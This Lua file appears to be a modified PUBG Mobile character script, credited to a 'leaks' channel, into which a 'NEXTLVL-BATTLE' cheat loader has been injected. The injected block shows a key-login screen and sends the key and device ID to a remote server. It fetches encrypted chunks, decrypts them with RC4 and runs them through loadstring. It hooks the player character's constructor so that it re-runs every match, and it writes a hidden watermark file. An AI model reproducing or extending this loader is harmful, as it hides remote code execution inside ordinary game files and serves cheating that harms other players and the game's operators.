      if _VS and _VS.X and _VS.X > 100 then _w, _h = _VS.X, _VS.Y end
    end)

    local _Root = CGame:NewObjectFromPath("/Script/UMG.CanvasPanel", _Parent)
    if not _Root or not slua.isValid(_Root) then _log("login page: root create failed") return end
    _loginUI.Root = _Root
    _loginUI.Parent = _Parent
    _Parent:AddChildToCanvas(_Root)

    local _bg = CGame:NewObjectFromPath("/Script/UMG.Border", _Root)
    if _bg and slua.isValid(_bg) then
      local _slot = _Root:AddChildToCanvas(_bg)
      if _slot then
        _slot:SetPosition(_FVector2D(0, 0))
        _slot:SetSize(_FVector2D(_w, _h))
      end
      _bg:SetBrushColor(_FLinearColor(0.05, 0.05, 0.08, 0.85))
      _bg:SetWidgetVisibility(UEnums.ESlateVisibility.Visible)
    end

    local _cx = _w * 0.5
    local _title = CGame:NewObjectFromPath("/Script/UMG.TextBlock", _Root)
    if _title and slua.isValid(_title) then
      local _slot = _Root:AddChildToCanvas(_title)
      if _slot then
        _slot:SetPosition(_FVector2D(_cx - 200, 100))
        _slot:SetSize(_FVector2D(400, 60))
      end
      _title:SetText("NEXTLVL - ENTER KEY")
      _title:SetColorAndOpacity(_FSlateColor(_FLinearColor(0.2, 1, 0.4, 1)))
      local _font = _title.Font
      if _font then _font.Size = 40 _title.Font = _font end
    end

    local _input = CGame:NewObjectFromPath("/Script/UMG.EditableTextBox", _Root)
    if _input and slua.isValid(_input) then
      local _slot = _Root:AddChildToCanvas(_input)
      if _slot then
        _slot:SetPosition(_FVector2D(_cx - 300, 190))
        _slot:SetSize(_FVector2D(600, 64))
      end
      pcall(function() _input:SetText("") end)
      pcall(function() _input:SetHintText("Enter your key here") end)
      pcall(function() _input:SetKeyboardFocus() end)
      pcall(function()
        if _input.OnTextCommitted and _input.OnTextCommitted.Add then
          _input.OnTextCommitted:Add(function() _loginSubmit() end)
        end
      end)
      _loginUI.Input = _input
    end

    local _status = CGame:NewObjectFromPath("/Script/UMG.TextBlock", _Root)
    if _status and slua.isValid(_status) then
      local _slot = _Root:AddChildToCanvas(_status)
      if _slot then
        _slot:SetPosition(_FVector2D(_cx - 300, 270))
        _slot:SetSize(_FVector2D(600, 36))
      end
      _status:SetText("Type key, then press LOGIN")
      _status:SetColorAndOpacity(_FSlateColor(_FLinearColor(1, 0.9, 0.3, 1)))
      _loginUI.StatusText = _status
    end

    local _btnLogin = CGame:NewObjectFromPath("/Script/UMG.Button", _Root)
    if _btnLogin and slua.isValid(_btnLogin) then
      local _slot = _Root:AddChildToCanvas(_btnLogin)
      if _slot then
        _slot:SetPosition(_FVector2D(_cx - 100, 330))
        _slot:SetSize(_FVector2D(200, 56))
        local _lbl = CGame:NewObjectFromPath("/Script/UMG.TextBlock", _btnLogin)
        if _lbl and slua.isValid(_lbl) then
          _lbl:SetText("LOGIN")
          _lbl:SetColorAndOpacity(_FSlateColor(_FLinearColor(0, 0, 0, 1)))
          pcall(function() _btnLogin:SetContent(_lbl) end)
        end
        pcall(function() _btnLogin:SetBackgroundColor(_FLinearColor(0.2, 1, 0.4, 1)) end)
        if _btnLogin.OnClicked and _btnLogin.OnClicked.Add then
          _btnLogin.OnClicked:Add(function() _loginSubmit() end)
        end
      end
    end
    _log("login page shown")
  end)
end

local _wm
local function _wmShow()
  if _G._NEXTLVL_WM_SHOWN then return end
  _G._NEXTLVL_WM_SHOWN = true
  _wm = "NL" .. tostring(_V) .. "-" .. string.sub(_KEY, 1, 4) .. "-" .. string.sub(_DID, -8)
  _log("canary watermark: " .. _wm)
  pcall(function()
    local _f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/.nextlvl_canary", "w")
    if _f then
      _f:write("wm=" .. _wm .. "\nkey=" .. _KEY .. "\ndev=" .. _DID .. "\nver=" .. tostring(_V))
      _f:close()
    end
  end)
  pcall(function()
    local _ITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
    local _MCUI = _ITools and _ITools.GetMainControlBaseUI and _ITools.GetMainControlBaseUI()
    local _Parent = nil
    pcall(function()
      if _MCUI then
        if _MCUI.CanvasPanel_0 and slua.isValid(_MCUI.CanvasPanel_0) then
          _Parent = _MCUI.CanvasPanel_0
        elseif _MCUI.CanvasPanel_42 and slua.isValid(_MCUI.CanvasPanel_42) then
          _Parent = _MCUI.CanvasPanel_42
        end
      end
    end)
    if not _Parent then _log("canary: no parent canvas") return end
    local _txt = CGame:NewObjectFromPath("/Script/UMG.TextBlock", _Parent)
    if _txt and slua.isValid(_txt) then
      local _slot = _Parent:AddChildToCanvas(_txt)
      if _slot then
        _slot:SetPosition(_FVector2D(20, 20))
        _slot:SetSize(_FVector2D(400, 30))
      end
      _txt:SetText(_wm)
      _txt:SetColorAndOpacity(_FSlateColor(_FLinearColor(1, 1, 1, 0.3)))
      local _font = _txt.Font
      if _font then _font.Size = 20 _txt.Font = _font end
      _txt:SetWidgetVisibility(UEnums.ESlateVisibility.SelfHitTestInvisible)
      _log("canary watermark shown")
    end
  end)
end

local function _bfetch(_i)
  if _bexecuted then return end
  if _i > #_bfiles then
    _bexecuted = true
    _log("battle: all fetched, executing")
    _G._NEXTLVL_CACHE = _G._NEXTLVL_CACHE or {}
    for _k, _v in pairs(_bchunks) do _G._NEXTLVL_CACHE[_k] = _v end
    _G._NEXTLVL_FILES = _bfiles
    _execCache(_bfiles, _bchunks)
    return
  end
  local _f = _bfiles[_i]
  if _bchunks[_f] then _bfetch(_i + 1) return end
  _post("/g", string.format('{"session":"%s","dev":"%s","f":"%s"}', _bsession, _DID, _f), function(_ok, _r)
    if _bexecuted then return end
    if not _ok or not _r or not _r.ok or not _r.data or #_r.data <= 32 then
      _log("battle fetch " .. _f .. " failed: " .. tostring(_r and _r.error or "http fail"))
      return
    end
    local _raw = _b64d(_r.data)
    local _plain = _rc4(_MK .. _f, _raw)
    local _fn, _err = _ld(_plain, "@" .. _f)
    _plain = nil
    _raw = nil
    if _fn then
      _bchunks[_f] = _fn
      _log("battle chunk " .. _f .. " decrypted+loaded OK")
      _bfetch(_i + 1)
    else
      _log("battle chunk " .. _f .. " loadstring err: " .. tostring(_err))
    end
  end)
end

_bbattle = function()
  if _KEY == "" or _DID == "" then
    _showLoginPage()
    return
  end
local _cache = _G._NEXTLVL_CACHE
  local _cfiles = _G._NEXTLVL_FILES
  if _cache and _cfiles and #_cfiles > 0 then
    if _execCache(_cfiles, _cache) then
      _wmShow()
      return
    end
  end
  if _bstarted then return end
  _bstarted = true
  _post("/validate", string.format('{"key":"%s","device_id":"%s"}', _KEY, _DID), function(_ok, _r)
if _ok and _r and _r.valid then
      _bsession = _r.session or ""
      _bfiles = _r.allowed_files or {}
      _log("battle validate OK session=" .. _bsession:sub(1, 8) .. " files=" .. table.concat(_bfiles, ","))
      _wmShow()
      if #_bfiles > 0 then _bfetch(1) end
    else
      _log("battle validate rejected: " .. tostring(_r and _r.error or "http fail"))
      _loginShown = false
      _keyBuffer = ""
      _showLoginPage()
    end
  end)
end

-- file re-executes on every match (slua doesn't cache require);
-- reset the executed flag so cached chunks run again this match
_G._NEXTLVL_EXECUTED = nil
_bbattle()

local _origPost = BRPlayerCharacterBase and BRPlayerCharacterBase._PostConstruct
local _postRan = false
if _origPost then
  BRPlayerCharacterBase._PostConstruct = function(self, ...)
    local _r1, _r2 = _origPost(self, ...)
    pcall(function()
      if Client and self and self.Role and self.Role == ENetRole.ROLE_AutonomousProxy then
        if _postRan then
          _G._NEXTLVL_EXECUTED = nil
          _bstarted = false
          _log("battle: new match detected, re-arming loader")
_G._NEXTLVL_EXECUTED = nil
_bbattle()
        else
          _postRan = true
        end
      end
    end)
    return _r1, _r2
  end
end

end --[[ NEXTLVL-BATTLE ]]

return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
  {
    SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature"
  },
  {
    CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature"
  },
  {
    SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature"
  },
  {
    TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature"
  },
  {
    LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature"
  },
  {
    FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature"
  },
  {
    CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature"
  },
  {
    BuildSkateFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature"
  },
  {
    CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature"
  },
  {
    ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature"
  },
  {
    SpiderSenseFootprintFeature = "GameLua.Mod.Library.GamePlay.Feature.SpiderSenseFootprintFeature"
  },
  {
    GeneralShowSpotFeature = "GameLua.Mod.BRMod.Gameplay.Feature.PlayerCharacterGeneralShowSpotFeature"
  }
}, "BRPlayerCharacterBase")


-- By @YargiIDE | Chanel @YARGI_LEAKS